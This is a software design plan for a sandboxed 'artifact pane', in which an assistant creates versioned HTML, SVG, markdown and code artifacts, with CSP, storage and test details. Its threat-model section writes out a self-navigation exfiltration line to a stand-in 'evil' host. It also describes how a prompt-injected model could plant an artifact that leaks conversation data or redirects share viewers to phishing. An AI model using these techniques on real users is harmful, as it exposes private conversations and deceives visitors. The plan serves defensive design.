# Plan — Artifact pane ("canvas"): model-created, versioned artifacts in a sandboxed side panel

planned-against: main @ 8b91841 — **execute only after `plan-rich-inline-rendering.md` has merged**
(re-check drift against that merge, not against 8b91841).

## Overview

**Goal:** the model can create and revise **artifacts**: a standalone HTML(+JS) page or app, an SVG,
a long markdown document, or a code file. Each one shows as a card in the chat and opens in a **side
pane** (a full-screen sheet on mobile). There, HTML/SVG run in a **sandboxed iframe**, markdown is
rendered, code is highlighted, and the user can copy, download, and step through **versions**.
Public share links show them too, in the same sandbox.

**Why now:** this is phase 2 of the "Agent42 canvas" effort (the user wants a Claude Artifacts /
ChatGPT Canvas equivalent). Phase 1 delivered the shared renderer (`/shared/lib/richtext.js`,
highlight.js, the markdown pipeline), which this plan reuses for the markdown and code kinds.

**Shape:**

```
model ── create_artifact(kind,title,content) ──► AgentGrain.ArtifactTools
      ── update_artifact(id,content,title?) ──►   ├─ size/count caps (ArtifactLimits)
      ── read_artifact(id,version?)         ──►   ├─ bytes → IAttachmentStore (blob, owner = user/conv)
                                                  ├─ ArtifactRecord in AgentGrainState.Artifacts [Id(15)]
                                                  └─ returns SHORT json {artifactId,version,kind,title}
after the turn: compact artifact tool-call args/results in the session (step 0 spike) → serialize

browser  ── toolCallEnd(create/update_artifact) ──► artifact card in bubble ──click──► side pane
         ── GET /api/conversations/{c}/artifacts                    (list + versions metadata)
         ── GET …/artifacts/{a}/versions/{n}/content   text/plain + nosniff + CSP sandbox   (copy/download/md/code)
         ── <iframe sandbox="allow-scripts" src=…/versions/{n}/frame>   text/html + CSP sandbox   (html/svg)
share    ── same two routes under /api/share/{token}/artifacts/…   (covered by the existing '/api/share/*' exclusion)
```

## Affected areas

Verified against the tree at the base commit. Exemplar paths are from `.agentic/gotchas.md`.

- **New grain partial** `src/Agent42.Agents/Artifacts/AgentGrain.ArtifactTools.cs`. Shape exemplar:
  `src/Agent42.Agents/Push/AgentGrain.PushTool.cs` (tool method, `[Description]` params, ephemeral
  guard idiom).
- **New types** in the flat `Agent42.Agents` namespace (rule 1): `ArtifactRecord`,
  `ArtifactVersionRef`, `ArtifactKind` (string constants, not an enum, so the wire format stays
  readable), `ArtifactLimits`, `ArtifactInfo` (client DTO). Put them in folder
  `src/Agent42.Agents/Artifacts/`.
- `src/Agent42.Agents/Conversations/AgentGrainState.cs`: trailing `[Id(15)]`
  `Dictionary<string, ArtifactRecord> Artifacts` with a non-null default. The current highest is
  `[Id(14)] AgentKind`. Re-check at execution.
- `src/Agent42.Agents/Tools/AgentGrain.BuildAgent.cs`: register the three tools (AIFunctionFactory, as
  push at ~L114).
- `src/Agent42.Agents/Tools/ToolCatalog.cs`: new key `artifacts`, `ToolNameToKey` for all three
  tool names, `Descriptors`, `AllSelectableToolKeys` (ADR 0021; copy the `PushNotification` entries).
- `src/Agent42.Agents/Conversations/IAgentGrain` (whatever interface `AgentGrain` implements, so check
  at execution) + `AgentGrain`: `GetArtifactsAsync()` and `GetArtifactVersionAsync(artifactId, version)`
  for the endpoints.
- `src/Agent42.Agents/Conversations/ChatTurn.cs`: trailing `[Id(4)] IReadOnlyList<ArtifactInfo>? Artifacts`,
  **projected** in `GetHistoryAsync` from the turn's artifact tool calls. It is not persisted, and the
  share endpoint does **not** strip it (it strips only `ToolCalls`, `AgentApi.Sharing.cs:70`).
- **New endpoints** `src/Agent42.Backend/Artifacts/AgentApi.Artifacts.cs` (exemplar
  `src/Agent42.Backend/Users/AgentApi.Users.cs`), **called from `MapAgentApi`** (rule 7: an uncalled
  partial silently deletes its endpoints). Share variants go in
  `src/Agent42.Backend/Sharing/AgentApi.Sharing.cs` next to the existing
  `/api/share/{token}/attachments/{attachmentId}` route (~L81), copying its token → directory →
  owner resolution.
- Frontend:
  - New classic script `src/Agent42.Backend/wwwroot/shared/lib/artifactpane.js` holds the pane and
    card logic, shared by the app and the viewer.
  - New thin module `src/Agent42.Backend/wwwroot/js/artifacts.js` (exemplar `js/conversations.js`),
    wired from `main.js` (`wireArtifacts()`).
  - Both go in SW `SHELL`, and `CACHE` is bumped.
  - Cards hook into `send.js` (toolCallEnd ~L218) and `renderTurns` in `js/conversations.js` (~L86).
  - Pane markup goes in `index.html` and styles in `styles.css`.
  - Viewer: `shared/viewer.js`, `shared/index.html`, `shared/viewer.css`.
- DevHost: `tools/Agent42.DevHost/CannedChatClient.cs` gets a trigger that calls `create_artifact`, then
  `update_artifact`.
- Tests: `AgentGrainTests.cs` (or a new `ArtifactToolTests.cs` on the shared cluster),
  `GrainStorageSerializerTests.cs`, `ToolCatalogTests.cs`, a new `ArtifactsApiTests.cs` (exemplar
  `McpServersApiTests.cs` + `SharedApiFixture.cs`), `ShareLinkAssetsTests.cs`, `PwaAssetsTests.cs`,
  `ProjectLayoutTests.cs`, a new `ArtifactAssetsTests.cs`.

## Context & constraints

**User decisions (interview)**

- Kinds: **html** (+JS), **svg**, **markdown**, **code** (code carries a `language`). All four ship.
- Share links **include** artifacts, rendered in the same sandbox. Viewers see every version
  referenced in the shared turns.
- **Model-only edits.** The user asks in chat, the model calls `update_artifact`, and every update is
  a new version. No in-pane editor (that is phase 3, out of scope).

**The two traps this design is built around**

1. **Tool-call ARGUMENTS are persisted too, not just results.** The gotcha "An agent tool's RETURN
   value is persisted" covers the result. But `create_artifact`/`update_artifact` *arguments* carry
   the whole artifact source, and the `FunctionCallContent` stays in the session that is
   re-serialized into the 2 MB `agent-state` item every turn (ADR 0004). Ten revisions of a 60 KB app
   would put 600 KB of dead text in the session, re-sent to the model each turn, until the
   conversation bricks **in prod only**. Mitigation, in order of preference:
   - **(a) Compaction (preferred, spike-gated in step 0):** after the turn, before
     `SerializeSessionAsync`, rewrite every artifact tool call's `content` argument to a stub
     (`"[stored as artifact {id} v{n}; call read_artifact to see it]"`), and do the same to
     `read_artifact` **results**. Within the turn the model saw the full text. On later turns it
     re-reads through `read_artifact`. The spike must prove three things on Agent Framework 1.19 and
     **both** chat paths (Chat Completions and Responses, ADR 0033 / gotcha "The Responses API is
     stateful by default"): the in-memory session messages can be mutated after the run, the
     serialized snapshot reflects it, and the next turn still works (tool-call/result pairing
     intact).
   - **(b) Fallback, if the spike fails:** no compaction. Instead apply a hard per-conversation
     **cumulative artifact budget** (e.g. `ArtifactLimits.MaxSessionArtifactBytes` ≈ 512 KB counted
     over create/update content plus read results). Once it is exceeded, the tools refuse with a
     message telling the user to continue in a new chat. Record which one shipped in the ADR.
   - Either way, `ArtifactLimits` caps one version's content (≈ 64 KB), versions per artifact (≈ 20),
     and artifacts per conversation (≈ 20), and the tool **refuses** over-cap content. It never
     truncates, because a truncated HTML app is broken. `read_artifact` returns at most one version.
   - The spike must also check whether a model that sees the stub in an earlier call copies it as
     `content` in a later call. If it does, the tool rejects stub-shaped content.
2. **Model-written HTML must never run on the app origin.** Anyone who opens
   `…/frame` directly as a top-level page would otherwise run model-authored script on
   `chat.agent42.nl` with the user's Easy Auth session, which is stored XSS that prompt-injected web
   content could plant. So the protection is a **response header**, not only the iframe attribute:
   - `Content-Security-Policy: sandbox allow-scripts; default-src 'none'; script-src 'unsafe-inline'
     https://cdnjs.cloudflare.com; style-src 'unsafe-inline' https://cdnjs.cloudflare.com; img-src data:
     blob:; font-src data: https://cdnjs.cloudflare.com; media-src data: blob:; connect-src 'none';
     form-action 'none'; base-uri 'none'; frame-ancestors 'self'` + `X-Content-Type-Options: nosniff` +
     `Referrer-Policy: no-referrer` + `Cache-Control: private, no-store`.
   - The `sandbox` directive (without `allow-same-origin`) gives the document an **opaque origin** even
     when navigated to directly. That means no cookies, no storage, and no reading `/api`. `connect-src
     'none'` blocks fetch/XHR/WebSocket, so a sandboxed page cannot fire cross-site requests at `/api`
     (Easy Auth's cookie may be `SameSite=None`, so this is CSRF defence too). No `allow-popups`, no
     `allow-top-navigation`, no `allow-forms`. Precedent: `src/Agent42.Backend/Web/SearxngProxy.cs`
     (~L86, ~L264) already sends a `sandbox` CSP header. Copy its shape.
   - The iframe element additionally carries `sandbox="allow-scripts"` and `referrerpolicy="no-referrer"`
     (defence in depth).
   - `/content` (raw source) is always `text/plain; charset=utf-8` with the same CSP and nosniff, so
     even an `.html` download link can't render as HTML in the origin.
   - **Egress (rule 13): there IS a real exfil path, and it can't be closed in a browser.** A
     sandboxed document can still **navigate itself** (`location = "https://evil/?d=…"`,
     `<meta http-equiv=refresh>`, an auto-clicked `<a>`). CSP `navigate-to` is not implemented
     anywhere, and the sandbox flags do not stop self-navigation. A prompt-injected model can
     therefore put conversation content into an artifact that ships it out when the pane opens, or
     when a public share viewer loads it. That viewer is an anonymous visitor, so the same channel can
     also redirect them to a phishing page. The cdnjs allowance additionally lets any cdnjs-hosted
     script gadget run (inside the sandbox). **User decision (2026-10-03):** accept this residual and
     keep the cdnjs allowance. Record both in the ADR as an explicit ADR 0013 extension. Do not write
     "no content leaves".
   - **Cookie-bearing same-origin GETs (gotcha "Proxying a third-party app onto our own origin",
     trap 2):** an opaque-origin document cannot *read* the app, but its self-navigation to a
     same-origin GET still carries the Easy Auth cookie. `form-action 'none'` already covers forms
     (and stays `'none'`; never `'self'`, which that gotcha measured as useless). Step 5 enumerates
     every authenticated **GET with a side effect** (known candidates: `/api/mcp/oauth/start` and
     `/api/mcp/oauth/callback`, `AgentApi.Mcp.cs:127–129`) and records whether a framed self-navigation
     to each does anything harmful. That gotcha's rule for a third surface applies: **measure, then
     decide**, and record the measurements in the ADR.
   - **SVG kind:** `/frame` wraps it in a minimal HTML document (`<!doctype html><body style=margin:0>` +
     the SVG). It runs under the same CSP, so a scripted SVG is contained exactly like HTML.
   - **Markdown and code kinds** never use the iframe. The pane fetches `/content`. **Markdown** goes
     through phase 1's sanitized pipeline (`renderMarkdown` + `Agent42Rich.enhance`). **Code** is set
     as `textContent` of a `<pre><code class="language-{lang}">` and highlighted with highlight.js
     directly. It is never wrapped in a markdown fence, which breaks on sources containing triple
     backticks.

**Investigation findings (evidence)**

- Tool shape, catalog wiring, and the key-coverage guard
  `ToolCatalogTests.EveryRegisteredTool_MapsToACatalogKey_OrIsGetDate_OrIsAnMcpTool`:
  `AgentGrain.PushTool.cs`, `AgentGrain.BuildAgent.cs` ~L114, `ToolCatalog.cs` ~L129/181/196/248.
- `IAttachmentStore.SaveAsync(ownerKey, fileName, mediaType, bytes)` takes any media type, and blobs
  are keyed `{userId}/{conversationId}/{attachmentId}` (`ownerKey` = `this.GetPrimaryKeyString()` in
  the grain, `AgentKey(userId, conversationId)` in the endpoints, `AgentApi.Attachments.cs:111`). The
  SAS/rehydrate machinery is **not** needed, because artifacts never reach the model as URLs.
  `OpenReadAsync` serves bytes for the endpoints.
- ⚠ **The existing attachment proxies would serve an artifact blob UNSANDBOXED.**
  `/api/conversations/{c}/attachments/{id}` (`AgentApi.Attachments.cs:107–113`) and the **public**
  `/api/share/{token}/attachments/{id}` (`AgentApi.Sharing.cs:81–90`) both return
  `Results.File(bytes, storedMediaType)` with no CSP and no nosniff, for **any** id under the owner
  key. An html/svg artifact stored as `text/html`/`image/svg+xml` would render on the app origin with
  the user's cookie, or for anonymous share visitors. So: **always store artifact bytes as
  `application/octet-stream`** (the kind lives in `ArtifactRecord`), **and** harden both attachment
  proxies with `X-Content-Type-Options: nosniff` (step 5). Two layers, each with a test.
- Post-turn persist sites (verified by review): `AgentGrain.cs` ~L1175–1177 and ~L1538–1545, plus
  `ImageGeneration/AgentGrain.ImageTurn.cs` ~L126. The other `SerializeSessionAsync` calls (~L447,
  ~L1038, ~L1611, `Documents/AgentGrain.Documents.cs` ~L105, ImageTurn ~L165/198) are rebuild
  snapshots. **The precedent for mutating history before every persist is
  `src/Agent42.Agents/Conversations/AgentGrain.Retention.cs`** (`StampMessageTimestamps` /
  `ApplyRetentionAsync` mutate the `TryGetInMemoryChatHistory` messages in place at all persist sites,
  and that survives the serialize round-trip). Compaction hooks in exactly there. The alternative the
  spike must weigh is a chat-client **reducer** below the function-invoking client (ADR 0082,
  `UseChatReducer`), which shrinks what is *sent* without mutating what is *stored*. That alternative
  fixes token cost but not the 2 MB cap, so it is not sufficient alone.
- `BuildAgent` has little S3776 headroom (comment at `AgentGrain.BuildAgent.cs` ~L316). Register the
  three tools through an extracted helper (`ArtifactTools(…)` returning the `AIFunction`s), not inline.
- Binding materialises `binding.EnabledTools ?? ToolCatalog.AllSelectableToolKeys` (`AgentGrain.cs`
  ~L432–436). So **stored agents with null tools, `/api/agent-run` and MCP-server consumers get the
  artifact tools ON**. Accepted: they still return ids in text, and the artifacts are viewable in the
  app's chat for that conversation. The tool descriptions must not promise a pane ("the user may be
  able to open it in the Agent42 UI"). A loop-enabled stored agent (`LoopAgent`) might create
  duplicates per iteration. Out of scope; the seeded research agent is `web_search`-only (ADR 0082)
  and unaffected.
- `PurgeAsync` (`AgentGrain.cs` ~L1420) does not delete attachment blobs today. Artifacts inherit the
  same gap. Clear `Artifacts` state in `PurgeAsync`, but leave blob deletion consistent with
  attachments (out of scope, note in ADR).
- Live stream: `send.js` handles `toolCallStart`/`toolCallEnd` (~L216–218), correlating by
  `toolCallId`. The card is driven from `toolCallEnd` of `create_artifact`/`update_artifact`, whose
  result is the short JSON. No new stream event type is needed.
- History: `ChatTurn` is the client DTO, and `GetHistoryAsync` already harvests tool calls per turn
  (`CollectToolResults` / `HarvestToolCalls`, ADR 0080). Project `Artifacts` from the **same**
  harvest, joined by `CallId` (gotcha "A tool result never arrives on the message that made the call":
  collect results first, position-blind). The share endpoint nulls `ToolCalls` but must keep
  `Artifacts`. That is why `Artifacts` is a separate field and the viewer doesn't parse tool calls.
- History projection hooks into `AttachPendingToolCalls` (`AgentGrain.cs` ~L1366), where `ToolCalls` is
  attached via `with`. Cards can vanish from history while the artifact still exists in state: a chain
  still open at a user turn is dropped (ADR 0080), and `StripToolHistory` (no-tools model downgrade)
  and retention pruning delete tool messages. So the pane **also** has an "Artifacts in this chat"
  list fed by `GET …/artifacts` (state, not history), and no artifact is ever unreachable. Cards stay
  the primary affordance.
- Share scope: a share link is a **live** view of the whole conversation (ADR 0035), so the share
  routes serve **every artifact and version in that conversation's state**, including ones from later
  turns, consistent with how later turns already appear. Publishing scriptable HTML from the app
  origin to anonymous visitors is an ADR 0035 extension, so record it in the ADR alongside the egress
  residual.
- Share: `/api/share/{token}/attachments/{attachmentId}` (`AgentApi.Sharing.cs` ~L78–90) is the model
  for token-scoped reads. The `'/api/share/*'` exclusion already covers new sub-routes. The rules
  from rule 4 apply: self-enforce, fail closed, userId from the share directory grain, **never**
  `GetUserId()`. The share endpoints must only serve artifact ids that exist in that conversation's
  `Artifacts` (resolved server-side, never trusting a client-supplied owner).
- **Ephemeral (incognito) chats: the tools REFUSE** with an early `if (_ephemeral) return …` as their
  first guard (gotcha "Ephemeral chat", trap 1; shape `PushTool_EphemeralChat_RefusesAndSendsNothing`).
  The image precedent does not transfer: an image is user-supplied, while an artifact is
  model-authored conversation content written to blob with no purge path, which breaks ADR 0034's
  "leaves no trace". A warm grain's next normal turn writes the whole `_state`, so state written by a
  refused-then-allowed sequence must be checked too. If you add any turn-scoped field (e.g. a
  per-turn artifact-call list for compaction), it must be cleared in `ChatAsync`'s `finally` **and**
  reset in `ReceiveReminder` (rule 6).
- **State persistence:** the tool mutates `_state.State.Artifacts` and relies on the **end-of-turn**
  `WriteStateAsync` (`AgentGrain.cs` ~L1177). It does **not** write state itself (the push tool's
  precedent). Rationale: the blob is written first, so a crash between the blob write and the state
  write orphans a blob (harmless), never a dangling ref.
- New selectable key `artifacts` lands **OFF** for anyone who has ever pressed Save (rule 11 /
  ADR 0021). Accepted. Say so in the ADR, and the user (the only user) can tick it. The model reads
  the rules from the **tool descriptions**, so those must say: when to create (substantial standalone
  output such as an app, page, diagram-as-SVG, document over ~40 lines, or a full code file) vs.
  answer inline; to prefer `update_artifact` over re-creating; that HTML runs sandboxed with no
  network (`fetch` fails) and may load libraries only from cdnjs; and to call `read_artifact` before
  editing an artifact from an earlier turn.

**Governing ADRs / gotchas:** ADR 0004 (blob, 2 MB), 0021 (selectable tools), 0033 (Responses API),
0034 (incognito), 0035 (share links), 0041 (ES modules), 0042 (excludedPaths), 0080 (tool replay),
phase-1 ADR. Gotchas: tool return persisted, selectable tools `null == all`, SHELL all-or-nothing,
CACHE bump, unreachable module, Cosmos `$type` namespace, collection expression into
`IReadOnlyList<T>` (use `List<T>`/`Dictionary` built with `new`, never `[..]`), shared static
instance as grain-state default (a default `Dictionary` must be `new()` per instance), turn-scoped
fields, a tool result never arrives on the call's message.

## Steps

0. **Spike: session compaction** (`/spike-dotnet`, file-based app pinned to repo package versions).
   Prove or disprove trap 1(a) on AF 1.19. Use a fake chat client that emits a tool call with a large
   argument. Mutate the call's arguments in the in-memory history the way
   `AgentGrain.Retention.cs` mutates messages, then serialize, deserialize and run a second turn.
   Check that the call/result pairing still holds, that the snapshot holds the stub, and that the
   model does not copy the stub. Check Chat Completions. For Responses, read the request the client
   would send on the repo's configured path. *Verify:* append the result to this spec under "Spike
   result", stating which branch, (a) or (b), step 3 implements. **Stop and tell the user if
   neither branch works.**
1. **Types + state.** `ArtifactRecord { Id, Kind, Title, Language?, CreatedAt, List<ArtifactVersionRef> Versions }`,
   `ArtifactVersionRef { Version, AttachmentId, SizeBytes, CreatedAt }`, all `[GenerateSerializer]` +
   `[Alias]` in `Agent42.Agents`. Add `[Id(15)] Artifacts = new()` on state, and a trailing
   `[Id(4)] Artifacts` on `ChatTurn`. *Verify:* `GrainStorageSerializerTests`:
   - (i) a state document written **before** the field exists deserializes with an empty dictionary
     (watch the gotcha "A record parameter a Cosmos document lacks binds to null");
   - (ii) a round-trip through the real Cosmos JSON serializer keeps two artifacts with two versions
     each, without swapping them;
   - (iii) a `ChatTurn` with `Artifacts` round-trips through Orleans and JSON.
2. **Tools.** `create_artifact(kind, title, content, language?)`, `update_artifact(artifactId, content, title?)`,
   `read_artifact(artifactId, version?)` in `AgentGrain.ArtifactTools.cs`.
   - First guard is `_ephemeral` refusal.
   - Then validate kind, language and caps, and refuse over-cap input with a clear message.
   - Save bytes via `IAttachmentStore` as **`application/octet-stream`**, then append the version to
     `_state.State.Artifacts`. There is no tool-side `WriteStateAsync`; the end-of-turn write persists
     it.
   - Return compact JSON `{"artifactId","version","kind","title"}`.
   - Register the tools through an extracted helper in `BuildAgent` and wire `ToolCatalog`. Keep every
     method under S3776 15.
   - Clear `Artifacts` in `PurgeAsync`.
   - Tool descriptions carry the model-facing rules (when to create vs. answer inline, prefer update,
     sandboxed with no network, cdnjs only if kept, read before editing an earlier artifact, no promise
     of a pane).

   *Verify (grain tests, shared cluster):*
   - create → update → read returns v2 content;
   - an unknown id refuses;
   - invalid kind or language refuses;
   - over-cap content refuses and stores nothing;
   - the 21st artifact or 21st version refuses;
   - the result is under 256 chars;
   - an incognito turn refuses and stores nothing, and the next normal turn on the warm grain works;
   - the stored media type is octet-stream;
   - `PurgeAsync` empties `Artifacts`;
   - the coverage guard passes;
   - deselecting `artifacts` removes all three tools.
3. **Session budget (from the spike).**
   - For (a): compact at the **post-turn persist sites** (`AgentGrain.cs` ~L1175–1177,
     ~L1538–1545, `AgentGrain.ImageTurn.cs` ~L126) by extending the `AgentGrain.Retention.cs` hook,
     not by touching the rebuild-snapshot sites.
   - For (b): a trailing `[Id(16)]` cumulative counter with a default, plus refusal.

   *Verify:*
   - (a) `ArtifactUpdates_DoNotBlowTheSessionSizeBudget`: after 10 updates of a 60 KB artifact, the
     serialized session stays under a stated bound. `CompactedArtifactCall_NextTurnSucceeds` also
     applies.
   - (b) `ArtifactBudget_RefusesPastTheSessionBudget`.
4. **History projection.** Fill `ChatTurn.Artifacts` in `AttachPendingToolCalls` from the harvested
   artifact tool calls, joined by `CallId`. *Verify:*
   - the card is projected for a **narrated** call (`FakeChatClient.NarratingCallTrigger` shape);
   - the share response keeps `Artifacts` and nulls `ToolCalls`.
5. **Endpoints + hardening.**
   - In `AgentApi.Artifacts.cs`:
     - `GET /api/conversations/{c}/artifacts` (metadata);
     - `GET …/{a}/versions/{n}/content` (`text/plain; charset=utf-8`);
     - `GET …/{a}/versions/{n}/frame` (html/svg only, svg wrapped in a minimal HTML doc, 404 for
       other kinds).
     - All responses carry the trap-2 headers (CSP sandbox, nosniff, `Referrer-Policy: no-referrer`,
       `Cache-Control: private, no-store`). The share twins go in `AgentApi.Sharing.cs`. Call the new
       partial from `MapAgentApi`.
   - Add `X-Content-Type-Options: nosniff` to **both** existing attachment proxies.
   - **Measure**: list every authenticated GET with a side effect (start with
     `/api/mcp/oauth/start|callback`). For each, record in the ADR what a framed self-navigation does.

   *Verify (`ArtifactsApiTests`):*
   - the exact CSP string includes `sandbox allow-scripts` and contains **no** `allow-same-origin`;
   - all four headers are present on `/content` and `/frame`, own and share variants;
   - `/content` is `text/plain` for an html artifact;
   - `/frame` on markdown → 404;
   - an svg `/frame` is wrapped HTML;
   - another user's conversation → 404;
   - a revoked/unknown share token gets the same uniform failure as the attachments share route;
   - an artifact id not in that conversation → 404;
   - both attachment proxies send nosniff;
   - `EasyAuthExclusionTests` passes with **no** bicep change, plus an assertion that the new share
     routes sit under `/api/share/*` and the authenticated routes are not excluded.
6. **Shared pane script.** Create a classic `shared/lib/artifactpane.js` (→ `window.Agent42ArtifactPane`,
   by phase 1's D1 reasoning). It provides `renderCard(bubble, info, opts)` and
   `openPane(host, info, { urls, renderMarkdown })`, with the URL builder and `renderMarkdown`
   **injected** by each page. The pane provides:
   - a version switcher;
   - copy (fetch `/content`);
   - download (a blob URL named from title + kind extension);
   - the "Artifacts in this chat" list;
   - close.

   For html/svg it renders `<iframe sandbox="allow-scripts" referrerpolicy="no-referrer" src=…/frame>`.
   For markdown it uses the injected `renderMarkdown` + `Agent42Rich.enhance`, and for code it uses
   `textContent` + highlight.js. Layout is a right-hand pane on wide screens and a full-screen sheet at
   ≤ 760 px (match `mcp.js` ~L390). *Verify:* `ArtifactAssetsTests`, which fetches the file from the
   fixture client and **not** through `GetAppScriptAsync`:
   - the iframe sandbox is exactly `allow-scripts`, and `allow-same-origin` appears nowhere;
   - fetched content never reaches `innerHTML` except through the injected `renderMarkdown`;
   - code uses `textContent`.
7. **Wire the app.**
   - Add a thin ES module `js/artifacts.js` (exemplar `js/conversations.js`) that injects the app's
     `renderMarkdown` and URL builders, renders cards from `toolCallEnd` of create/update (`send.js`
     ~L218) and from `turn.artifacts` in `renderTurns` (`conversations.js` ~L86).
   - Add `wireArtifacts()` and call it from `main.js`.
   - Add a classic script tag for `artifactpane.js` in `index.html`.
   - SHELL gets `/js/artifacts.js` **and** `/shared/lib/artifactpane.js`. Bump `CACHE`.

   *Verify:*
   - `ProjectLayoutTests`: the module is reachable, SHELL `/js/` equals the directory, and `wire*` is
     called from `main.js`;
   - `PwaAssetsTests.ServiceWorker_CacheNameIsCurrent` is updated, plus an assertion that SHELL lists
     `/shared/lib/artifactpane.js`.
8. **Wire the share viewer** (after 7). `shared/index.html` loads `lib/artifactpane.js` with a
   **relative** path (`ShareLinkAssetsTests` forbids `/lib/` in the page). `viewer.js` injects its own
   `renderMarkdown` and share-route URL builders. *Verify:* `ShareLinkAssetsTests`: the page is still
   self-contained, viewer.js uses the `/api/share/` artifact routes, and the pane script is loaded.
9. **DevHost trigger** `"make an artifact"`: one turn calls `create_artifact` with a small HTML page.
   The page has an inline script that draws on a canvas, plus a `fetch('/api/conversations')` whose
   failure it prints, to demo the sandbox. A second prompt, `"update the artifact"`, calls
   `update_artifact`. These are tool-call triggers, so they belong in `SelectToolCall`. Mind the
   ordering comment there and the "a tool already ran" guard (~L239–290).
10. **Browser verification (manual, required).** Using DevHost, confirm each item:
    - create → card → the pane renders and the script runs;
    - the in-artifact `fetch` fails with a CSP violation;
    - opening `…/frame` directly in a tab renders the page with an opaque origin, so `document.cookie`
      and `localStorage` throw;
    - opening the blob via `…/attachments/{attachmentId}` downloads it or shows text, and never
      renders it;
    - update → v2 card, and the switcher flips v1↔v2;
    - the "Artifacts in this chat" list works;
    - markdown and code kinds render (code containing ```` ``` ```` too);
    - copy and download work;
    - reload restores the cards;
    - the mobile sheet works;
    - the share link in a private window shows the artifacts, and they run sandboxed.

    Capture a GIF.
11. **ADR + docs.** `/decide`. The ADR covers:
    - the artifact model (kinds, versions, caps, octet-stream storage);
    - the CSP/sandbox posture;
    - **the self-navigation exfil residual and the cdnjs decision as an ADR 0013 extension**;
    - the step 5 measurements;
    - (a) vs (b) from the spike;
    - share inclusion as an ADR 0035 extension;
    - the incognito refusal;
    - OFF-for-savers / ON-for-null-binding agents;
    - the blob-not-purged inheritance.

    `/gotcha` entries:
    - "artifact tool ARGUMENTS are persisted; compact or budget";
    - "`/frame` safety is the CSP `sandbox` header, not the iframe attribute";
    - "artifact blobs are octet-stream because the attachment proxies serve any id".

    Also add a new row "Artifacts / canvas" to CLAUDE.md's feature map, and run `/sync-docs`.

Order: 0 → 1 → 2 → 3 → 4 → 5 → 6 → 7 → 8 → 10 → 11. Step 9 can run any time after 2.

## Spike result

Run 2026-10-03 on **Agent Framework 1.22.0** (the repo moved from 1.19 to 1.22 after this plan was written),
file-based app with a fake streaming `IChatClient` and `UseFunctionInvocation`, `InMemoryChatHistoryProvider`.
Turn 1 emits `create_artifact` with a 60 000-char `content` argument. The spike then replaces that
`FunctionCallContent` in the `TryGetInMemoryChatHistory` list with a copy whose `content` is a stub, serializes,
deserializes into a fresh session and runs turn 2. Output:

```
stubbed=1 before=60603 after=630 snapshotHasStub=True
turn2 sent 5 msgs; calls=1 results=1 paired=True callArgContent='[stored as artifact a1 v1]' bigInRequest=False
PASS
```

- **Branch (a), compaction, ships.** Replacing the content object in place survives serialize → JSON →
  deserialize, and the next turn sends the call and its result paired by `CallId`.
- **Responses path:** it is stateless (`AsIChatClientWithStoredOutputDisabled`, gotcha "The Responses API is
  stateful by default"), so it replays the same session history as Chat Completions. A stubbed argument is still
  a JSON string, so the request shape is unchanged. Nothing path-specific is needed.
- **Stub imitation** is a live-model property that a fake client cannot measure. So the defence ships
  unconditionally: `create_artifact`/`update_artifact` reject content that starts with the stub prefix.

## Acceptance criteria → test mapping

| # | Acceptance criterion | Test | File |
|---|---|---|---|
| 1 | `Artifacts` state reads from old Cosmos docs and round-trips; `ChatTurn.Artifacts` round-trips | `ArtifactsWrittenBefore_FieldExisted_Deserializes`, `Artifacts_RoundTripThroughCosmosJson`, `ChatTurn_Artifacts_RoundTrip` | `tests/Agent42.Tests/GrainStorageSerializerTests.cs` |
| 2 | create/update/read work; versions increment; read returns the requested version | `ArtifactTools_CreateUpdateRead` | `tests/Agent42.Tests/ArtifactToolTests.cs` |
| 3 | Invalid kind/language, unknown id, over-cap content/versions/artifacts refuse and store nothing | `ArtifactTools_RefuseInvalidAndOverCaps` | `ArtifactToolTests.cs` |
| 4 | Tool results are short | `ArtifactTools_ReturnCompactResult` | `ArtifactToolTests.cs` |
| 5 | Incognito turn refuses and stores nothing; next normal turn works | `ArtifactTools_EphemeralChat_RefusesAndStoresNothing` | `ArtifactToolTests.cs` |
| 6 | Blob stored as octet-stream | `ArtifactTools_StoreOctetStream` | `ArtifactToolTests.cs` |
| 7 | `PurgeAsync` clears `Artifacts` | `Purge_ClearsArtifacts` | `ArtifactToolTests.cs` |
| 8 | **(a) only:** session bounded across many updates; next turn after compaction works | `ArtifactUpdates_DoNotBlowTheSessionSizeBudget`, `CompactedArtifactCall_NextTurnSucceeds` | `tests/Agent42.Tests/AgentGrainTests.cs`, `ArtifactToolTests.cs` |
| 8b | **(b) only:** tools refuse past the cumulative budget | `ArtifactBudget_RefusesPastTheSessionBudget` | `ArtifactToolTests.cs` |
| 9 | `artifacts` is a selectable key, all three tools map to it, and deselecting removes them | existing coverage guard + `Artifacts_Deselected_RegistersNoArtifactTools` | `tests/Agent42.Tests/ToolCatalogTests.cs`, `ArtifactToolTests.cs` |
| 10 | History projects `Artifacts`, also for a narrated call | `History_ProjectsArtifacts_ForNarratedCall` | `ArtifactToolTests.cs` |
| 11 | Share response keeps `Artifacts` and strips `ToolCalls` | `Share_KeepsArtifacts_StripsToolCalls` | `tests/Agent42.Tests/ArtifactsApiTests.cs` |
| 12 | `/frame` + `/content` (own + share) send CSP sandbox (no `allow-same-origin`), nosniff, Referrer-Policy, Cache-Control; `/content` is text/plain; svg frame is wrapped | `Frame_And_Content_SendSandboxHeaders`, `SvgFrame_IsWrappedHtml` | `ArtifactsApiTests.cs` |
| 13 | Attachment proxies (own + share) send nosniff | `AttachmentProxies_SendNoSniff` | `ArtifactsApiTests.cs` |
| 14 | Cross-user and unknown-artifact access → 404; share failures uniform | `Artifacts_AreOwnerScoped`, `ShareArtifacts_FailClosed` | `ArtifactsApiTests.cs` |
| 15 | No new Easy Auth exclusion; share sub-routes covered by `/api/share/*` | `EasyAuthExclusionTests` (existing + route assertion) | `tests/Agent42.Tests/EasyAuthExclusionTests.cs` |
| 16 | Pane script sandboxed, no `allow-same-origin`, md via injected sanitizer, code via textContent | `ArtifactPane_IsSandboxed` | `tests/Agent42.Tests/ArtifactAssetsTests.cs` |
| 17 | App module reachable and in SHELL, pane script in SHELL, CACHE bumped | `ProjectLayoutTests` (existing), `ServiceWorker_CacheNameIsCurrent`, `ServiceWorkerShell_ListsArtifactPane` | `ProjectLayoutTests.cs`, `tests/Agent42.Tests/PwaAssetsTests.cs` |
| 18 | Viewer shows artifacts via share routes, self-contained | `Viewer_RendersArtifactsViaShareRoutes` | `tests/Agent42.Tests/ShareLinkAssetsTests.cs` |
| 19 | End-to-end UX, sandbox behaviour, attachment-route non-render, mobile, share | manual step 10 | — |

## Quality gate checklist

Copied from `.agentic/quality-gates.yaml` at plan time:

| Gate | Threshold | Tool |
|---|---|---|
